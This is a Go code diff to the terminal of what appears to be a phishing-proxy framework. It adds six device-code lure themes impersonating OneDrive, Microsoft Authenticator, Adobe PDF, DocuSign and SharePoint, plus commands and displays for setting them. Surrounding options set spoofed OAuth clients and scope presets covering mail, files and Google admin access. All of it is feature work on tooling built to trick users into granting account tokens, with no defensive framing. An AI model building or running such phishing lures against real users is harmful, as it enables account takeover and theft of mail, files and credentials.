@@ -353,17 +353,32 @@ func (t *Terminal) handleQuickstart(args []string) error {
 	t.cfg.SetSiteEnabled(phishlet)
 	t.manageCertificates(true)
 
-	// 8. Create lure
-	log.Info("[8/8] creating lure...")
-	l := &Lure{
-		Path:     "/" + GenRandomLurePath(),
-		Phishlet: phishlet,
+	// 8. Create 6 themed lures
+	log.Info("[8/8] creating themed lures...")
+	themes := []struct {
+		name  string
+		label string
+	}{
+		{"", "Default"},
+		{"onedrive", "OneDrive"},
+		{"authenticator", "Authenticator"},
+		{"adobe", "Adobe PDF"},
+		{"docusign", "DocuSign"},
+		{"sharepoint", "SharePoint"},
 	}
-	t.cfg.AddLure(phishlet, l)
-	lureID := len(t.cfg.lures) - 1
-	log.Info("lure ID: %d", lureID)
 
-	// Get the lure URL - use the landing subdomain from phishlet
+	startID := len(t.cfg.lures)
+	for _, theme := range themes {
+		l := &Lure{
+			Path:            "/" + GenRandomLurePath(),
+			Phishlet:        phishlet,
+			DeviceCodeTheme: theme.name,
+		}
+		t.cfg.AddLure(phishlet, l)
+	}
+	log.Success("created %d themed lures (IDs %d-%d)", len(themes), startID, startID+len(themes)-1)
+
+	// Get the lure URL for the first (default) lure
 	pl, plErr := t.cfg.GetPhishlet(phishlet)
 	if plErr == nil {
 		// Get landing subdomain from phishlet's proxy_hosts
@@ -371,10 +386,12 @@ func (t *Terminal) handleQuickstart(args []string) error {
 		if phishlet == "google" {
 			landingSub = "accounts"
 		}
+		firstLure := t.cfg.lures[startID]
 		lureHost := landingSub + "." + hostname
-		lureURL := fmt.Sprintf("https://%s%s", lureHost, l.Path)
+		lureURL := fmt.Sprintf("https://%s%s", lureHost, firstLure.Path)
 		_ = pl
-		log.Success("lure URL: %s", lureURL)
+		log.Success("default lure URL: %s", lureURL)
+		log.Info("use 'lures get-url <id>' to get URL for each theme")
 	}
 
 	// Optional: Telegram setup
@@ -2058,12 +2075,37 @@ func (t *Terminal) handleLures(args []string) error {
 				if err != nil {
 					return err
 				}
-				l := &Lure{
-					Path:     "/" + GenRandomLurePath(),
-					Phishlet: args[1],
+
+				// Create 6 lures automatically - one for each device code theme
+				themes := []struct {
+					name  string
+					label string
+				}{
+					{"", "Default"},
+					{"onedrive", "OneDrive"},
+					{"authenticator", "Authenticator"},
+					{"adobe", "Adobe PDF"},
+					{"docusign", "DocuSign"},
+					{"sharepoint", "SharePoint"},
 				}
-				t.cfg.AddLure(args[1], l)
-				log.Info("created lure with ID: %d", len(t.cfg.lures)-1)
+
+				startID := len(t.cfg.lures)
+				for i, theme := range themes {
+					l := &Lure{
+						Path:            "/" + GenRandomLurePath(),
+						Phishlet:        args[1],
+						DeviceCodeTheme: theme.name,
+					}
+					t.cfg.AddLure(args[1], l)
+					lureID := startID + i
+					themeName := theme.label
+					if theme.name == "" {
+						themeName = "Default"
+					}
+					log.Info("created lure ID: %d  [%s]", lureID, themeName)
+				}
+				log.Success("created %d themed lures (IDs %d-%d) for phishlet '%s'", len(themes), startID, startID+len(themes)-1, args[1])
+				log.Info("use 'lures get-url <id>' to get the themed URL for each lure")
 				return nil
 			}
 			return fmt.Errorf("incorrect number of arguments")
@@ -2214,6 +2256,23 @@ func (t *Terminal) handleLures(args []string) error {
 						out += " ; " + params
 					}
 					out += "\n"
+				}
+
+				// Show theme label if this lure has a dc_theme set
+				dcTheme := l.DeviceCodeTheme
+				if dcTheme != "" {
+					themeLabels := map[string]string{
+						"onedrive":      "OneDrive",
+						"authenticator": "Authenticator",
+						"adobe":         "Adobe PDF",
+						"docusign":      "DocuSign",
+						"sharepoint":    "SharePoint",
+					}
+					label := themeLabels[dcTheme]
+					if label == "" {
+						label = dcTheme
+					}
+					out += color.New(color.FgHiCyan).Sprintf("  theme: %s", label) + "\n"
 				}
 
 				t.output("%s", out)
@@ -2474,6 +2533,29 @@ func (t *Terminal) handleLures(args []string) error {
 					l.DeviceCodeTemplate = val
 					do_update = true
 					log.Info("lure '%d' device code template set to: %s", l_id, val)
+				case "dc_theme":
+					val = strings.ToLower(val)
+					validThemes := []string{"default", "onedrive", "authenticator", "adobe", "docusign", "sharepoint"}
+					valid := false
+					for _, vt := range validThemes {
+						if val == vt {
+							valid = true
+							break
+						}
+					}
+					if !valid {
+						return fmt.Errorf("edit: invalid theme '%s' (valid: default, onedrive, authenticator, adobe, docusign, sharepoint)", val)
+					}
+					if val == "default" {
+						val = ""
+					}
+					l.DeviceCodeTheme = val
+					do_update = true
+					if val == "" {
+						log.Info("lure '%d' device code theme set to: default", l_id)
+					} else {
+						log.Info("lure '%d' device code theme set to: %s", l_id, val)
+					}
 				case "dc_provider":
 					val = strings.ToLower(val)
 					if !IsValidDCProvider(val) {
@@ -2569,8 +2651,26 @@ func (t *Terminal) handleLures(args []string) error {
 
 			var s_paused string = higreen.Sprint(GetDurationString(time.Now(), time.Unix(l.PausedUntil, 0)))
 
-			keys := []string{"phishlet", "hostname", "path", "redirector", "ua_filter", "redirect_url", "paused", "info", "og_title", "og_desc", "og_image", "og_url"}
-			vals := []string{hiblue.Sprint(l.Phishlet), cyan.Sprint(l.Hostname), hcyan.Sprint(l.Path), white.Sprint(l.Redirector), green.Sprint(l.UserAgentFilter), yellow.Sprint(l.RedirectUrl), s_paused, l.Info, dgray.Sprint(l.OgTitle), dgray.Sprint(l.OgDescription), dgray.Sprint(l.OgImageUrl), dgray.Sprint(l.OgUrl)}
+			// Device code details
+			dcMode := l.DeviceCodeMode
+			if dcMode == "" {
+				dcMode = "off"
+			}
+			dcTheme := l.DeviceCodeTheme
+			if dcTheme == "" {
+				dcTheme = "default"
+			}
+			dcClient := l.DeviceCodeClient
+			if dcClient == "" {
+				dcClient = "-"
+			}
+			dcScope := l.DeviceCodeScope
+			if dcScope == "" {
+				dcScope = "-"
+			}
+
+			keys := []string{"phishlet", "hostname", "path", "redirector", "ua_filter", "redirect_url", "paused", "info", "og_title", "og_desc", "og_image", "og_url", "dc_mode", "dc_theme", "dc_client", "dc_scope"}
+			vals := []string{hiblue.Sprint(l.Phishlet), cyan.Sprint(l.Hostname), hcyan.Sprint(l.Path), white.Sprint(l.Redirector), green.Sprint(l.UserAgentFilter), yellow.Sprint(l.RedirectUrl), s_paused, l.Info, dgray.Sprint(l.OgTitle), dgray.Sprint(l.OgDescription), dgray.Sprint(l.OgImageUrl), dgray.Sprint(l.OgUrl), hiblue.Sprint(dcMode), hcyan.Sprint(dcTheme), green.Sprint(dcClient), green.Sprint(dcScope)}
 			log.Printf("\n%s\n", AsRows(keys, vals))
 
 			return nil
@@ -3046,7 +3146,8 @@ func (t *Terminal) createHelp() {
 				readline.PcItem("dc_provider", readline.PcItem("microsoft"), readline.PcItem("google")),
 				readline.PcItem("dc_client", readline.PcItem("ms_office"), readline.PcItem("ms_teams"), readline.PcItem("azure_cli"), readline.PcItem("ms_outlook"), readline.PcItem("ms_graph"), readline.PcItem("google_cloud_sdk"), readline.PcItem("google_tv"), readline.PcItem("google_device_policy"), readline.PcItem("google_chrome_sync"), readline.PcItem("google_ios")),
 				readline.PcItem("dc_scope", readline.PcItem("full"), readline.PcItem("mail"), readline.PcItem("files"), readline.PcItem("user"), readline.PcItem("minimal"), readline.PcItem("gmail"), readline.PcItem("gdrive"), readline.PcItem("gworkspace"), readline.PcItem("gcalendar"), readline.PcItem("gcontacts"), readline.PcItem("gcloud"), readline.PcItem("gprofile"), readline.PcItem("gadmin"), readline.PcItem("gall")),
-				readline.PcItem("dc_template", readline.PcItem("success"), readline.PcItem("fallback"), readline.PcItem("compliance")))),
+				readline.PcItem("dc_template", readline.PcItem("success"), readline.PcItem("fallback"), readline.PcItem("compliance")),
+				readline.PcItem("dc_theme", readline.PcItem("default"), readline.PcItem("onedrive"), readline.PcItem("authenticator"), readline.PcItem("adobe"), readline.PcItem("docusign"), readline.PcItem("sharepoint")))),
 			readline.PcItem("delete", readline.PcItem("all"))))
 
 	h.AddSubCommand("lures", nil, "", "show all create lures")
@@ -3075,6 +3176,7 @@ func (t *Terminal) createHelp() {
 	h.AddSubCommand("lures", []string{"edit", "dc_client"}, "edit <id> dc_client <client>", "set OAuth client for device code (ms_office, ms_teams, google_cloud_sdk, google_tv, etc.)")
 	h.AddSubCommand("lures", []string{"edit", "dc_scope"}, "edit <id> dc_scope <scope>", "set scope preset (microsoft: full, mail, files | google: gmail, gdrive, gworkspace, gall)")
 	h.AddSubCommand("lures", []string{"edit", "dc_template"}, "edit <id> dc_template <template>", "set interstitial template (success, fallback, compliance)")
+	h.AddSubCommand("lures", []string{"edit", "dc_theme"}, "edit <id> dc_theme <theme>", "set themed landing page (default, onedrive, authenticator, adobe, docusign, sharepoint)")
 
 	h.AddCommand("blacklist", "general", "manage automatic blacklisting of requesting ip addresses", "Select what kind of requests should result in requesting IP addresses to be blacklisted.", LAYER_TOP,
 		readline.PcItem("blacklist", readline.PcItem("all"), readline.PcItem("unauth"), readline.PcItem("noadd"), readline.PcItem("off"), readline.PcItem("log", readline.PcItem("on"), readline.PcItem("off"))))
@@ -3484,7 +3586,7 @@ func (t *Terminal) sprintLures() string {
 	white := color.New(color.FgHiWhite)
 	magenta := color.New(color.FgMagenta)
 	//n := 0
-	cols := []string{"id", "phishlet", "hostname", "domain", "path", "redirector", "redirect_url", "paused", "og", "dc_mode"}
+	cols := []string{"id", "phishlet", "hostname", "domain", "path", "redirector", "redirect_url", "paused", "og", "dc_mode", "dc_theme"}
 	var rows [][]string
 	for n, l := range t.cfg.lures {
 		var og string
@@ -3531,11 +3633,34 @@ func (t *Terminal) sprintLures() string {
 			dcStr = yellow.Sprint(dcMode)
 		case DCModeAuto:
 			dcStr = hcyan.Sprint(dcMode)
+		case DCModeDirect:
+			dcStr = higreen.Sprint(dcMode)
 		default:
 			dcStr = "-"
 		}
 
-		rows = append(rows, []string{strconv.Itoa(n), hiblue.Sprint(l.Phishlet), cyan.Sprint(l.Hostname), domainStr, hcyan.Sprint(l.Path), white.Sprint(l.Redirector), yellow.Sprint(l.RedirectUrl), s_paused, og, dcStr})
+		// Device code theme display
+		dcTheme := l.DeviceCodeTheme
+		if dcTheme == "" {
+			dcTheme = "-"
+		}
+		var dcThemeStr string
+		switch dcTheme {
+		case "onedrive":
+			dcThemeStr = hiblue.Sprint(dcTheme)
+		case "authenticator":
+			dcThemeStr = hcyan.Sprint(dcTheme)
+		case "adobe":
+			dcThemeStr = color.New(color.FgHiRed).Sprint(dcTheme)
+		case "docusign":
+			dcThemeStr = yellow.Sprint(dcTheme)
+		case "sharepoint":
+			dcThemeStr = higreen.Sprint(dcTheme)
+		default:
+			dcThemeStr = "-"
+		}
+
+		rows = append(rows, []string{strconv.Itoa(n), hiblue.Sprint(l.Phishlet), cyan.Sprint(l.Hostname), domainStr, hcyan.Sprint(l.Path), white.Sprint(l.Redirector), yellow.Sprint(l.RedirectUrl), s_paused, og, dcStr, dcThemeStr})
 	}
 	return AsTable(cols, rows)
 }
